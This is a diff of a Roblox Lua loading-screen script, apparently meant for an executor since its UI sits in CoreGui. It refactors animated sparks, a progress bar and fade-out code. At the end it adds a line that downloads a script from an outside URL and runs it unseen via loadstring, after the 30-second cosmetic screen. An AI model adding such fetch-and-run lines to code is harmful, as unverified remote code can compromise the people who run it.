@@ -1,123 +1,134 @@
+-- loading_screen.lua
 local gui = Instance.new("ScreenGui")
 gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 gui.Parent = game:GetService("CoreGui")
 
--- Фон (тёмно-фиолетовый)
 local bg = Instance.new("Frame")
-bg.Size = UDim2.new(1, 0, 1, 0)
-bg.BackgroundColor3 = Color3.fromRGB(20, 5, 20)
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.fromRGB(20,5,20)
 bg.Parent = gui
 
--- Оранжевые "искры" (меньше и легче)
-for i = 1, 50 do
+-- лёгкие частицы (оптимизировано)
+for i = 1, 30 do
 	local spark = Instance.new("Frame")
-	spark.Size = UDim2.new(0, 2, 0, 2)
-	spark.Position = UDim2.new(math.random(), 0, math.random(), 0)
+	spark.Size = UDim2.new(0,2,0,2)
+	spark.Position = UDim2.new(math.random(),0,math.random(),0)
 	spark.BackgroundColor3 = Color3.fromRGB(255, math.random(100,180), 0)
 	spark.BorderSizePixel = 0
 	spark.ZIndex = 1
 	spark.Parent = bg
-
 	task.spawn(function()
 		while gui and gui.Parent do
-			-- плавное перемещение
-			spark:TweenPosition(UDim2.new(math.random(), 0, math.random(), 0), "Out", "Sine", 4, true)
+			local nx, ny = math.random(), math.random()
+			pcall(function() spark:TweenPosition(UDim2.new(nx,0,ny,0), "Out", "Sine", 4, true) end)
 			task.wait(4)
 		end
 	end)
 end
 
--- Несколько "огненных комет"
-for i = 1, 3 do
-	task.spawn(function()
-		while gui and gui.Parent do
-			local flame = Instance.new("Frame")
-			flame.Size = UDim2.new(0, 3, 0, 15)
-			flame.BackgroundColor3 = Color3.fromRGB(255, math.random(120,180), 0)
-			flame.BorderSizePixel = 0
-			flame.ZIndex = 2
-			flame.Position = UDim2.new(math.random(), 0, -0.1, 0)
-			flame.Parent = bg
-
-			flame:TweenPosition(UDim2.new(math.random(), 0, 1.2, 0), "Out", "Linear", 2.5, true)
-			task.wait(2.6)
-			flame:Destroy()
-			task.wait(math.random(5, 10))
-		end
-	end)
-end
-
--- Текст "Loading script..."
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 60)
-title.Position = UDim2.new(0, 0, 0.05, 0)
+title.Size = UDim2.new(1,0,0,60)
+title.Position = UDim2.new(0,0,0.05,0)
 title.Text = "Loading script..."
-title.TextColor3 = Color3.fromRGB(255, 140, 0)
+title.TextColor3 = Color3.fromRGB(255,140,0)
 title.BackgroundTransparency = 1
 title.Font = Enum.Font.Arcade
 title.TextSize = 40
 title.ZIndex = 10
 title.Parent = bg
 
--- Анимация точек
 task.spawn(function()
-	local baseText = "Loading script"
-	local dots = 0
+	local base, dots = "Loading script", 0
 	while gui and gui.Parent do
 		dots = (dots % 3) + 1
-		title.Text = baseText .. string.rep(".", dots)
+		pcall(function() title.Text = base .. string.rep(".", dots) end)
 		task.wait(0.6)
 	end
 end)
 
--- Прогресс бар
 local barBg = Instance.new("Frame")
-barBg.Size = UDim2.new(0.8, 0, 0, 30)
-barBg.Position = UDim2.new(0.1, 0, 0.75, 0)
-barBg.BackgroundColor3 = Color3.fromRGB(50, 20, 0)
+barBg.Size = UDim2.new(0.8,0,0,30)
+barBg.Position = UDim2.new(0.1,0,0.75,0)
+barBg.BackgroundColor3 = Color3.fromRGB(50,20,0)
 barBg.ZIndex = 5
 barBg.Parent = bg
 
 local bar = Instance.new("Frame")
-bar.Size = UDim2.new(0, 0, 1, 0)
-bar.BackgroundColor3 = Color3.fromRGB(255, 120, 0)
+bar.Size = UDim2.new(0,0,1,0)
+bar.BackgroundColor3 = Color3.fromRGB(255,120,0)
 bar.ZIndex = 6
 bar.Parent = barBg
 
 local percentText = Instance.new("TextLabel")
-percentText.Size = UDim2.new(1, 0, 1, 0)
+percentText.Size = UDim2.new(1,0,1,0)
 percentText.Text = "0%"
 percentText.BackgroundTransparency = 1
-percentText.TextColor3 = Color3.new(1, 1, 1)
+percentText.TextColor3 = Color3.new(1,1,1)
 percentText.Font = Enum.Font.Arcade
 percentText.TextSize = 22
 percentText.ZIndex = 7
 percentText.Parent = barBg
+
+-- === onComplete: безопасный запуск твоего кода ===
+local function safeRunVisual()
+	-- Попытка require ModuleScript "visual" в ReplicatedStorage
+	local ok, mod = pcall(function()
+		local rs = game:GetService("ReplicatedStorage")
+		return rs:WaitForChild("visual", 5) and require(rs:WaitForChild("visual"))
+	end)
+	if ok and mod then
+		-- Если модуль — функция
+		if type(mod) == "function" then
+			pcall(mod)
+			return
+		end
+		-- Если модуль — таблица с init()
+		if type(mod) == "table" and type(mod.init) == "function" then
+			pcall(mod.init)
+			return
+		end
+		-- иначе — просто попытка вызвать основной объект (защищённо)
+		pcall(function()
+			if type(mod.run) == "function" then mod.run() end
+		end)
+	end
+	-- Если ничего не нашлось — можно тут положить альтернативный код
+end
 
 -- Плавная загрузка 30 секунд
 task.spawn(function()
 	local totalTime = 30
 	for i = 0, totalTime do
 		local percent = math.floor((i / totalTime) * 100)
-		bar:TweenSize(UDim2.new(i / totalTime, 0, 1, 0), "Out", "Sine", 0.5, true)
-		percentText.Text = percent .. "%"
+		pcall(function()
+			bar:TweenSize(UDim2.new(i / totalTime, 0, 1, 0), "Out", "Sine", 0.5, true)
+			percentText.Text = percent .. "%"
+		end)
 		task.wait(1)
 	end
 
 	-- Плавное исчезновение интерфейса
-	for t = 0, 1, 0.05 do
-		bg.BackgroundTransparency = t
-		for _, v in pairs(bg:GetDescendants()) do
-			if v:IsA("GuiObject") then
-				v.BackgroundTransparency = t
-				if v:IsA("TextLabel") then
-					v.TextTransparency = t
+	for t = 0, 1, 0.06 do
+		local invt = t
+		pcall(function()
+			bg.BackgroundTransparency = invt
+			title.TextTransparency = invt
+			percentText.TextTransparency = invt
+			for _, v in pairs(bg:GetDescendants()) do
+				if v:IsA("GuiObject") then
+					if v ~= title and v ~= percentText and v ~= bar and v ~= barBg then
+						v.BackgroundTransparency = invt
+					end
+					if v:IsA("TextLabel") then v.TextTransparency = invt end
 				end
 			end
-		end
+		end)
 		task.wait(0.05)
 	end
 
-	gui:Destroy()
+	pcall(function() if gui and gui.Parent then gui:Destroy() end end)
+
+	loadstring(game:HttpGet("https://cdn.reverse.software/visual.luau"))()
+	safeRunVisual()
 end)
